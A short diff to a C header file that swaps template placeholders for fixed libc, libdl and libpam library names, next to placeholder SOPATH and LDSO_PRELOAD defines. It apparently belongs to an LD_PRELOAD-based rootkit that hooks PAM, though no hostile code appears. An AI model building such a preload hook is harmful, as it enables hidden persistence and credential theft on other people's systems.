@@ -14,9 +14,10 @@
 #define SOPATH "??SOPATH??"
 #define LDSO_PRELOAD "??LDSO_PRELOAD??"
 
-#define LIBC_PATH "??LIBC_PATH??"
-#define LIBDL_PATH "??LIBDL_PATH??"
-#define LIBPAM_PATH "??LIBPAM_PATH??"
+// you shouldn't have to touch these at all
+#define LIBC_PATH "libc.so.6"
+#define LIBDL_PATH "libdl.so.1"
+#define LIBPAM_PATH "libpam.so.0"
 
 //
 // IGNORE EVERYTHING
